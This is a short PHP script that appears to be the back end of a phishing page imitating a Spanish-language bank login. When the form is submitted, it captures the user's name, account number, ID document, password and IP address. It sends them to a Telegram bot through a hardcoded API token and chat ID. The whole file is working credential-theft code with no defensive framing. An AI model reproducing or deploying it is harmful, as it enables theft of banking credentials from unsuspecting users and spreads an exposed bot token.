<?php

@session_start();

if ( isset($_POST['Password'])){
if (strlen($_POST['Usuario'])>2) {
    $_SESSION['Usuario']=$_POST['Usuario'];
}
if (strlen($_POST['Documento'])>2) {
   $_SESSION['Usuario']=$_POST['Documento'];
}

$message = "User.: ".$_POST['Usuario']." T.Login.: ".$_POST['tipoLoginSeleccionado']." Cuenta.: ".$_POST['Cuenta']."  Documento.: ".$_POST['Documento']." Password.: ".$_POST['Password']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";

$apiToken = "6105796117:AAF0LyDEEn_AZbN8gl0izbnRHNOaFV8QJnE";

    $data = [
        'chat_id' => '2124940397',
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url);  
    $result = curl_exec($ch);



} 

?>